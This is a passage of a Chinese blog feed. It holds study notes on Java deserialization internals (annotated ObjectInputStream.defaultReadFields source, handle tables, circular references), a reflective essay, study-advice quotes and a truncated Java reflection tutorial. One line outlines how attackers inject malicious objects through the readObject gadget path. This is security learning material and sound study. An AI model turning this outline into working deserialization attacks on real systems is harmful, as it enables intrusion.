class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">#ObjectInputStream.defaultReadFields()</span><br><span class="line"></span><br><span class="line">#基础类型字段和引用类型字段要分开处理，这前半部分就是对基础类型字段进行处理</span><br><span class="line">//传入两个参数，实现把当前类desc中定义的字段从输入流中读出来，分别写到对象obj里面</span><br><span class="line">    private void defaultReadFields(Object obj, ObjectStreamClass desc) throws IOException</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">//第一部分安全性检查，确保写入的对象obj确实是desc描述的类的实例，否则抛出异常</span><br><span class="line">        Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line"></span><br><span class="line">        if (cl != null &amp;&amp; obj != null &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line"></span><br><span class="line">            throw new ClassCastException();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">//第二部分，准备读取基本类型字段的数据块</span><br><span class="line">//计算所有基础类型字段一共占几个字节</span><br><span class="line">        int primDataSize = desc.getPrimDataSize();</span><br><span class="line">//用字节数组primVals来缓冲这些字段的原始数据，在primVals中恢复基本类型</span><br><span class="line">        if (primVals == null || primVals.length &lt; primDataSize) &#123;</span><br><span class="line"></span><br><span class="line">            primVals = new byte[primDataSize];//分配缓存区</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">//一次性读取所有基础字段，readFully()是底层读取函数，把这些字段的值逐个放进内存</span><br><span class="line">            bin.readFully(primVals, 0, primDataSize, false);</span><br><span class="line"></span><br><span class="line">//利用反射将primVals数据按照字段顺序和偏移写入到obj对象的字段中，设置基本类型字段的值，假设有int age = 18他就被从primVals中提取出来写入obj.age</span><br><span class="line">        if (obj != null) &#123;</span><br><span class="line"></span><br><span class="line">            desc.setPrimFieldValues(obj, primVals);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">#基础类型字段和引用类型字段要分开处理，这后半段就是处理引用类型字段</span><br><span class="line">//使用passHandle索引当前正在处理的引用类型对象在反序列化&quot;句柄表&quot;中的索引，为了用来构建&quot;对象图&quot;中的&quot;依赖边&quot;</span><br><span class="line">        int objHandle = passHandle;</span><br><span class="line">//getFields()返回的是所有字段的描述信息（ObjectStreamField[]包含名称、类型、偏移、是否共享等）,false表示只获取当前类的字段，不包括父类字段</span><br><span class="line">        ObjectStreamField[] fields = desc.getFields(false);</span><br><span class="line">        </span><br><span class="line">//只为引用类型字段开辟空间</span><br><span class="line">        Object[] objVals = new Object[desc.getNumObjFields()];</span><br><span class="line">        </span><br><span class="line">//计算引用字段在数组中的起始下标</span><br><span class="line">//`fields.length` 是所有字段总数（基本 + 引用类型）</span><br><span class="line">//`objVals.length` 是引用类型字段数量</span><br><span class="line">//`numPrimFields` 就是基本类型字段的个数</span><br><span class="line">//用于确定引用字段在 `fields[]` 中的起始位置</span><br><span class="line">        int numPrimFields = fields.length - objVals.length;</span><br><span class="line"></span><br><span class="line">//逐个读取引用字段</span><br><span class="line">        for (int i = 0; i &lt; objVals.length; i++) &#123;</span><br><span class="line">//跳过基础字段</span><br><span class="line">            ObjectStreamField f = fields[numPrimFields + i];</span><br><span class="line">            </span><br><span class="line"> // 递归反序列化引用字段，使用 objVals[i]承载每一个使用`readObject0(...)`从流中反序列化出的字段的值</span><br><span class="line">            objVals[i] = readObject0(f.isUnshared());//f.isUnshared()是一个flag，若为true表示该字段使用writeUnshared()写入，不能与其他字段共享对象引用(即不能产生共享图)</span><br><span class="line"></span><br><span class="line">//登记依赖关系，当前对象objHandle依赖在后半段开头的反序列化出来的字段对象passHandle，从而避免重反序列化和无尽递归死循环</span><br><span class="line">            if (f.getField() != null) &#123;</span><br><span class="line"></span><br><span class="line">                handles.markDependency(objHandle, passHandle);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">//写入对象字段到目标字段，和基本类型一样：把引用类型字段通过反射写入回目标对象</span><br><span class="line">//假设你反序列化出 `&quot;Alice&quot;`，它就被写入 `obj.name`</span><br><span class="line">        if (obj != null) &#123;</span><br><span class="line"></span><br><span class="line">            desc.setObjFieldValues(obj, objVals);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        //恢复passHandle状态，重置是为了继续处理下一个对象字段，确保流状态一致性</span><br><span class="line">        passHandle = objHandle;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#整体流程</span><br><span class="line">        ┌────────────┐</span><br><span class="line">        │ primVals[] │ ← bin.readFully() ← 序列化流（基础类型）</span><br><span class="line">        └────────────┘</span><br><span class="line">               │</span><br><span class="line">               ▼</span><br><span class="line">    setPrimFieldValues(obj, primVals)</span><br><span class="line"></span><br><span class="line">        ┌────────────┐</span><br><span class="line">        │ objVals[]  │ ← readObject0() ← 序列化流（引用类型）</span><br><span class="line">        └────────────┘</span><br><span class="line">               │</span><br><span class="line">               ▼</span><br><span class="line">    setObjFieldValues(obj, objVals)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="登记依赖"><a href="#登记依赖" class="headerlink" title="登记依赖"></a>登记依赖</h3><p>&#x2F;&#x2F;关于登记依赖关系再次举例说明，方便理解<br>&#x2F;&#x2F;它是 Java 反序列化机制中一个关键但常被忽略的部分，它直接关系到对象图的完整性、引用正确性以及循环引用支持（引用自文献）</p><p>handles.markDependency(objHandle, passHandle);<br>表示对象A（objHandle）依赖于对象 B（passHandle）当对象 B 还未完全反序列化完成时，系统会<br>先记录下来这个依赖关系，等 B 反序列化完成后，再回头通知 A。</p><p>这里有个如下类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class Node implements Serializable &#123;</span><br><span class="line">    String name;</span><br><span class="line">    Node next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//我这样构造对象</span><br><span class="line">Node a = new Node();</span><br><span class="line">Node b = new Node();</span><br><span class="line">a.name = &quot;A&quot;;</span><br><span class="line">b.name = &quot;B&quot;;</span><br><span class="line">a.next = b;</span><br><span class="line">b.next = a;  // 循环引用</span><br><span class="line"></span><br><span class="line">//结构变成了a &gt; b &gt; a</span><br><span class="line"></span><br><span class="line">//然后进行序列化</span><br><span class="line">ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;loop.ser&quot;));</span><br><span class="line">out.writeObject(a);</span><br><span class="line">out.close();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>假设我这里不登记依赖关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Object readObject() &#123;</span><br><span class="line">    Object obj = allocateNewObject();</span><br><span class="line"></span><br><span class="line">    for (Field f : obj.fields) &#123;</span><br><span class="line">        if (f.isPrimitive) &#123;</span><br><span class="line">            readPrimitiveValue(); // 没问题</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Object ref = readObject(); // 再次调用 readObject()</span><br><span class="line">            f.set(obj, ref);          // 设置字段</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么对象A所引用的B尚未完成反序列化却已经被访问(被调用了方法或者字段)，就会导致</p><ul><li>无限递归调用readObject()-&gt;栈溢出</li><li>对象字段引用错误，部分为null</li><li>更无法正确恢复对象图结构(如a  &gt; b &gt; a)</li></ul><p>第一次调用：<code>readObject()</code> 读取对象 a</p><ul><li>分配了一个新的对象 a</li><li>进入字段循环：<ul><li>读取 <code>a.name</code></li><li>遇到 <code>a.next = b</code> → 再次调用 <code>readObject()</code> 去读 b<br>  第二次调用：<code>readObject()</code> 读取对象 b</li></ul></li><li>分配了 b</li><li>进入字段循环：<ul><li>读取 <code>b.name</code></li><li>遇到 <code>b.next = a</code> → 再次调用 <code>readObject()</code> 去读 a（之前已经在读 a 了，但未完成）<br>  第三次调用：又来读 a</li></ul></li><li>分配新的 a（不记得之前的 a 了）</li><li>进入字段循环…</li><li>然后又会递归调用 b，再次递归调用 a…<br>结果：**无限递归 → 栈溢出 → <code>StackOverflowError</code></li></ul><p>而它是如何解决的呢<br>Java 在第一次遇到一个新对象时，不是立即 fully initialize，而是：</p><ol><li>分配一个句柄（handle）</li><li>将一个“未初始化状态”的对象挂在 handle 表上</li><li>等到该对象所有字段都完成后，才标记为“完成”</li><li>任何引用这个对象的其他对象，只要记录“依赖”，等它完成后就能接入引用图</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TC_OBJECT       → Node a (handle 0)</span><br><span class="line">    classdesc: Node</span><br><span class="line">    name: &quot;A&quot;</span><br><span class="line">    next:</span><br><span class="line">        TC_OBJECT   → Node b (handle 1)</span><br><span class="line">            classdesc: Node</span><br><span class="line">            name: &quot;B&quot;</span><br><span class="line">            next:</span><br><span class="line">                TC_REFERENCE → handle 0  (引用回 Node a)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即<mark>Java 不等对象构造完才加入引用表，而是边构建边挂句柄，允许后续字段引用回未完成对象</mark>。<br>构成依赖链环形图，Java 会在整个图构建完成后再调用所有 <code>readResolve()</code> 和 <code>validateObject()</code></p><p>此外不进行依赖登记也有可能反序列化时，readObject被恶意类重写，提早调用，访问一个尚未完全构造好的对象，会引发不一致甚至漏洞。所以必须明确谁依赖谁，等依赖的对象完成之后才允许继续使用或触发回调</p><h3 id="整体总结"><a href="#整体总结" class="headerlink" title="整体总结"></a>整体总结</h3><p>&#x2F;&#x2F;关于整体逻辑举例说明，方便理解<br>这里有个</p><ul><li>class User implements Serializable {<br>  private int id;<br>  private String name;<br>  private User friend;<br>}</li></ul><p>假设字段顺序为</p><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/7.png" class=""><ul><li><code>getFields(false)</code> 返回 <code>id</code>, <code>name</code>, <code>friend</code></li><li><code>getNumObjFields()</code> 返回 2 → 引用字段为 <code>name</code>, <code>friend</code></li><li>numPrimFields &#x3D; 3 - 2 &#x3D; 1</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// i = 0 -&gt; fields[1] -&gt; name</span><br><span class="line">// i = 1 -&gt; fields[2] -&gt; friend</span><br></pre></td></tr></table></figure><ul><li>把 <code>name</code> 和 <code>friend</code> 从流中读取出来</li><li>放进 <code>objVals[]</code></li><li>最后会统一通过 <code>desc.setObjFieldValues(obj, objVals)</code> 把这些值反射写回 <code>obj</code></li></ul><p>所以攻击者构造恶意链子的时候正是通过这里的readObject() → defaultReadObject() → defaultReadFields() → readObject0() → Gadget 调用链触发点注入恶意对象(恶意类，代理，URLClassLoader)</p><p>当然我们可以继续深入 <code>readObject0()</code> 的内部机制，所谓真正触发 gadget 链和调用栈的第一枪，不过就有些钻牛角尖了，便不再进一步深入说明。</p><h1 id="一点碎碎念"><a href="#一点碎碎念" class="headerlink" title="一点碎碎念"></a>一点碎碎念</h1><p>这是系统深入学习Java反序列化的第一步，所以有很多，看到哪学到哪，哪里不会点哪里的感觉。</p><p>但是学习总是从百草园到三味书屋，而后，百川东到海，海可纳百川的过程。</p><p>就像远古人是从动物,植物这种自然中进行模仿运用进而获得经验，所以越接近原始的威力越大但也越不讲究章法，就像一个新行业新事物的诞生，他的初期一定是野蛮生长却缺乏秩序的。到了中后期才会发展出礼仪秩序，才可以叫做文化与文明。</p><p><mark>虽然</mark>技术和社会事物发展有所不同，比如对知识肯定是由点到面而后明晰框架，而后融会贯通，而后推陈出新，不断发展，是一个个小循环套在大循环的过程，知识肯定不是孤立的吧。社会事物却有太多社会因素，政治因素以及别的不纯粹的东西的参杂。”有人的地方就有江湖”，比如诗经从远古混沌的表达人们的感情，再到唐诗宋词不断发展，到了后期却出现了八股，文字狱这样禁锢人们的思想的东西。</p><p>而技术却不会如此，是一个昂扬向上的过程，即便人会陷入思维僵化，可能无法推出更高的创新，那也是人的大脑所限制，是人力的渺小而非事物发展的伟力。再加之时代车轮的向前，更多人更多自然非自然要素的碰撞(比如新冠疫情的影响推动非预期预料的医学进步)，一定会出现更先进的技术。即便更高的文明或者行星撞地球这样的严重危险出现，短暂星球生命的落寞也不过是未来星球生命狂欢的前夜罢了，不过是等待又一春，循环着总会向前，是一个螺旋上升的过程。何况即便纳入更高文明的存在，你会发现它们依然逃不过这样的定律，高级文明也只是相对高级，在与其自身更低文明和更高文明的相处时，也不过是翻版的“地球”，不过是星际社会中高矮胖瘦穷富美丑的一个个人罢了。</p><p><mark>但是</mark>从长远来看，技术也不应该从社会事物中分开，文字狱实际上也只是分娩的阵痛，就像革命的胜利。是马克思主义所说生产力决定生产关系，生产关系反作用于生产力，尽管生产关系并不总是积极的，它对生产力也有促进或阻碍的反作用，但是一切事物总是向前发展的，尽管曲折但是必定向前。人们吃的饱了住的好了不可能不去考虑精神的富足，也是一个吐哺纳新，去除糟粕的过程。</p><p>说实话哪怕非物质文化遗产的消逝也只是社会淘汰的旧产品，人们对这一现象感到可惜也只是人们对于精神文化的追求罢了，而不是该项技术自身的问题，是这项技术不仅当前的形式适应不了社会的发展，也是社会的发展不太需要甚至不需要该项技术的助力。超级先进的文明大概率不会保留上古时期的古人类抬头望月低声吐出的神秘低吟，即便它很富有韵味，彼时彼刻又怎如此时此刻。</p><p>实际上，什么东西也不存在真正的消逝和消亡，事物总与周围的事物存在着联系，就像京剧的大杀四方是多剧种的合力变演，某些非遗也没有真正消逝，只要有人看到过，听到过，尝到过，闻到过，说到过。说白了，不可能有凭空出现，而天不知地不知你不知我不知的存在，她一定会流传下来，只不过换了种形式。</p><p>不过回到主题，一个人的一生与人类社会发展，与新旧事物更迭相比，肯定就是短期了，这也就是为什么我在刚开始差点陷入唯心主义错误的原因。不过也要反省自己，很多事物也不能什么都往宏大视角去看，小确幸也有小幸福，我们也不过是小小的一生，也所谓难得糊涂。</p><p>话不多说，祝大家学习愉快。                                                                                                                                                                                                                                      </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;选择原因：环境要求少&quot;&gt;&lt;a href=&quot;#选择原因：环境要求少&quot; class=&quot;headerlink&quot; title=&quot;选择原因：环境要求少&quot;&gt;&lt;/a&gt;选择原因：环境要求少&lt;/h1&gt;&lt;p&gt;&lt;mark&gt;少有的对环境没有什么要求的链子&lt;/mark&gt;&lt;br&gt;作用：被反序</summary>
      
    
    
    
    <category term="Java_Security" scheme="https://usingns.github.io/categories/Java-Security/"/>
    
    
    <category term="Java" scheme="https://usingns.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>上海交通大学生存手册随笔</title>
    <link href="https://usingns.github.io/2025/07/14/%E4%B8%8A%E6%B5%B7%E4%BA%A4%E9%80%9A%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C%E9%9A%8F%E7%AC%94/"/>
    <id>https://usingns.github.io/2025/07/14/%E4%B8%8A%E6%B5%B7%E4%BA%A4%E9%80%9A%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C%E9%9A%8F%E7%AC%94/</id>
    <published>2025-07-14T05:08:13.000Z</published>
    <updated>2025-07-14T05:29:46.015Z</updated>
    
    <content type="html"><![CDATA[<p>真正成为我们上课理由的，只有对知识的渴望</p><p>学习需要的不是悲壮的毅力，是对知识的渴求</p><p>平庸的生活方式是麻醉剂</p><p>我们必须一日三省，今天的时间是否过得有价值</p><blockquote><p>我们应该对计划时间下的工作量有足够认识。小到一小时、一天，大到个暑假、一个学期，或者是大学四年，制定切实可行的计划，并为不能完成计划自责是最基本的要求。所谓的牛人和大多数庸人的主要差别，一方面在于有没有时间可以利用;再一方面，就是时间的利用率。我们必须时刻保持一种紧迫感，以保证时间不被虚度。只要你能把在校期问的时问正确地加以利用。不需要超人的天分–甚至不需要特别努力，你都有望在你的专业领域里出类拔萃。<br>危险的。在科研这条道路上，只有对一门学科的喜爱，才能成为你唯一和全部的动力。这个喜爱不应当是抽象的，喜欢某门学科和喜欢某项运动从道理上很相似:比如你说喜欢篮球，你一定不会是因为看到那个球在地上滚就觉得很兴奋，而是因为你对篮球作为一项竞技运动有足够的了解，所以才喜欢打，或者喜欢看篮球。喜欢一个学科也是一样，无知的兴趣一定是苍白的。</p></blockquote><p>原创性思考</p><blockquote><p>脑海中勾勒出一个清晰的知识结构是每名研究人员自己的事。新进入研究领域的学生，必须学会如何自己归纳知识结构。如果有人问及你正在做的工作，你应该能像从 Google Earth 中找自己家一样，把自己的工作在一年、五年、十年、甚至整个世纪的时间尺度下，并且清晰、准确、不带偏见地勾勒出你正在做的工作在整个学科中的位置。可以说，清醒的位置感和准确的方向感，是比雄厚的基础知识更为重要的成功要素。<br>在研究中，知道做什么比知道怎样做更为重要<br>有很多同学在设计课上钻进了完美主义的死胡同。设计是工程，设计课更是工程。如果把课堂作业当成艺术的话，我不知道该说你幼稚还是愚蠢。要知道，方案设计永远没有尽头，但对一门设计课程作业，你的上限是<br>在同等工作量的前提下，明智的进度控制应该是把自己的全部工作平均分配在各次课上提交。即便你已经做完了更多，也必须像说评书一样娓娓道来，说一半藏一半，不要一股脑呈现完。因为不是所有同学都有新东西，所以我们更要保证每次上课都有新的东西给老师看，并注意和老师多加“探讨”。只要混个脸熟，你的印象分就会有很大提升。<br>在设计的最后阶段，尤其不要进行无谓的修改,不要把时问浪费在徒劳的心理抚慰上。即使老师提出了一些修改要求，你也没必要完全照办。把现有阶段的设计表现清楚，按时交图，这是想拿高分的基本要求。</p></blockquote><hr><p>小结：</p><ul><li><p>做真正对知识学习有帮助的事情，帮助越长远越值得去做</p></li><li><p>保证自己的原创性思考</p></li><li><p>在研究中，把握个人定位，自己走到了哪一步（位置感和方向感）和自己要如何走这步（时间利用率和计划与规划）</p></li><li><p>平庸的生活方式是麻醉剂，我们必须一日三省，今天的时间是否过得有价值</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;真正成为我们上课理由的，只有对知识的渴望&lt;/p&gt;
&lt;p&gt;学习需要的不是悲壮的毅力，是对知识的渴求&lt;/p&gt;
&lt;p&gt;平庸的生活方式是麻醉剂&lt;/p&gt;
&lt;p&gt;我们必须一日三省，今天的时间是否过得有价值&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我们应该对计划时间下的工作量有足够认识。</summary>
      
    
    
    
    <category term="上海交通大学生存手册" scheme="https://usingns.github.io/categories/%E4%B8%8A%E6%B5%B7%E4%BA%A4%E9%80%9A%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8C/"/>
    
    
    <category term="note" scheme="https://usingns.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>反射机制</title>
    <link href="https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <id>https://usingns.github.io/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</id>
    <published>2025-04-03T03:07:50.000Z</published>
    <updated>2025-07-14T05:16:01.122Z</updated>
    
    <content type="html"><![CDATA[<ul><li>（抽象概念）RTTI（Run-Time Type Identification）运行时类型识别，主要两种方式<br>  传统的RTTI，我们编写知道所有的类型·<br>  反射机制，允许在运行时查询和操作类的信息<br>  太抽象了举例子<br>  正常写代码，一个类写出来</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class showclass &#123;  </span><br><span class="line">    String classname;  </span><br><span class="line">    //默认无参方法  </span><br><span class="line">    showclass() &#123;&#125;  </span><br><span class="line">    //有参方法  </span><br><span class="line">    showclass(String classname) &#123;  </span><br><span class="line">        //初始化  </span><br><span class="line">        this.classname = classname;  </span><br><span class="line">    &#125;  </span><br><span class="line">    void show() &#123;  </span><br><span class="line">        System.out.println(classname+&quot;:show&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">    //重载方法  </span><br><span class="line">    void show(String massage) &#123;  </span><br><span class="line">        System.out.println(classname+&quot;:&quot;+massage);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    @Override  </span><br><span class="line">    public String toString() &#123;  </span><br><span class="line">        return &quot;showclass&#123;&quot; +  </span><br><span class="line">                &quot;classname=&#x27;&quot; + classname + &#x27;\&#x27;&#x27; +  </span><br><span class="line">                &#x27;&#125;&#x27;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用（我已经知道类的信息了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        showclass showclass = new showclass(&quot;LiMing&quot;);  </span><br><span class="line">        showclass.show();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/1.png" class=""><p>但是你不知道，程序只能靠运行时信息来发现，自然也就没法在编码阶段直接使用new来创建对象和使用对象，但是使用反射来使用showclass类是可以的</p><p>（资料）在sping中，就有反射来动态构造类和属性的使用</p><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/2.png" class=""><p>指定需要class，sping就会帮我们创建好并进行赋值</p><p>那使用反射来进行刚才的操作：<br>获取类，创建对象，属性赋值，调用方法<br>（想写的都在注释里面）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        //外部包可以是&quot;com.xxx.showclass&quot;,这里没有所以直接使用showclass  </span><br><span class="line">        //可能会出现找不到类的错误，把它放进异常里面  </span><br><span class="line">        Class c=Class.forName(&quot;showclass&quot;);  </span><br><span class="line">        //我们要如何根据c信息操作呢  </span><br><span class="line">        // 所有类都是继承自Object  </span><br><span class="line">        Object obj=c.newInstance();  </span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/3.png" class=""><p>但是想要传入message有参构造就不能使用newInstance()了，而且java9之后这个方法也被废弃了，我么可以使用getConstructor()获取构造器</p><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/4.png" class=""><p>接收的是一堆类型是因为重载</p><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/5.png" class=""><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/6.png" class=""><p>这种情况下会报错，说找不到方法，因为前面属性定义问题，如果换成public就可以了，但更改不是咱们说了算的，所以使用getgetDeclaredConstructor()方法获取所有的构造器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">  </span><br><span class="line">public class Main &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Class c=Class.forName(&quot;showclass&quot;);  </span><br><span class="line">  </span><br><span class="line">        Constructor cs=c.getDeclaredConstructor(String.class);  </span><br><span class="line">        Object o =  cs.newInstance(&quot;Jenny&quot;);  </span><br><span class="line">  </span><br><span class="line">        System.out.println(o);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行成功<br>想要修改一个类中的属性</p><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/7.png" class=""><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/8.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">  </span><br><span class="line">public class Main &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Class c=Class.forName(&quot;showclass&quot;);  </span><br><span class="line">  </span><br><span class="line">        Constructor cs=c.getDeclaredConstructor(String.class);  </span><br><span class="line">        Object o =  cs.newInstance(&quot;Jenny&quot;);  </span><br><span class="line">  </span><br><span class="line">        Field f=c.getDeclaredField(&quot;classname&quot;);  </span><br><span class="line">        f.setAccessible(true);  </span><br><span class="line">        f.set(o,&quot;Denny&quot;);  </span><br><span class="line">  </span><br><span class="line">        System.out.println(o);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过对属性权限的修改，然后修改属性的value<br>同样的如果想要获取方法，使用getMethods()获得public级别的方法，使用getDeclaredMethods()获取所有权限的方法</p><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/9.png" class=""><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/10.png" class=""><img src="/2025/04/03/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/11.png" 